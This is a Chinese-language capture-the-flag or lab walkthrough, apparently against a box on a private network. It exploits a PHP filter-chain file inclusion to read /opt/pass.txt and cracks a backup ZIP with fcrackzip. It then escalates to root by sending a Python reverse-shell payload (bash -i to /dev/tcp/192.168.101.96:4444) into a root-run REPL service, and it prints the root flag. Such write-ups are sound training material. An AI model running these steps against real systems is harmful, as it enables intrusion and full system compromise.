## 二、漏洞复现 - PHP Filter Chain LFI

### 2.1 漏洞发现

Web 应用存在 PHP 文件包含漏洞，可通过 `php://filter` 链利用读取服务器本地文件。

### 2.2 利用 PHP Filter Chain Oracle

使用 [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) 工具：

```bash
python3 filters_chain_oracle_exploit.py \
    --target http://192.168.101.97 \
    --parameter 0 \
    --file /opt/pass.txt
```

参数说明：
- `--target`：目标 URL
- `--parameter 0`：指定利用第 0 个 GET/POST 参数
- `--file`：要读取的服务器文件路径

### 2.3 获取凭据


## 三、获取 User 权限

### 3.1 发现备份文件

通过 SSH 登录后，在 `/opt/` 目录下发现 `backup.zip` 压缩包。

### 3.2 下载备份文件

```bash
scp ll104567@192.168.101.97:/opt/backup.zip ~/Desktop/
```

### 3.3 破解 ZIP 密码

```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u ~/Desktop/backup.zip
```

## 四、提权 - Root 权限

### 4.1 信息枚举

登录后发现本地端口 `2026` 上运行着一个 Python 交互式服务（推测为自定义的 Python REPL / 调试服务）。

### 4.2 利用 Python 服务注入反弹 Shell

编写注入脚本 `/tmp/inject_shell.py`：

```python
import socket
s = socket.socket()
s.connect(("127.0.0.1", 2026))
s.recv(4096)  # 吃掉 banner
# 反弹 shell 的 Python 2 payload
payload = "__import__('os').system('bash -c \"bash -i >& /dev/tcp/192.168.101.96/4444 0>&1\"')\n"
s.send(payload.encode())
s.close()
```

### 4.3 执行注入

**攻击机先开启监听：**

```bash
nc -lvnp 4444
```

**靶机上执行注入脚本：**

```bash
python3 /tmp/inject_shell.py
```

### 4.4 获取 Root Shell

反弹的 shell 以 root 权限运行（端口 2026 的服务以 root 身份运行），获取 root flag：

```
flag{root-b371b86c0a18386c23a7480a739f76eb}
```
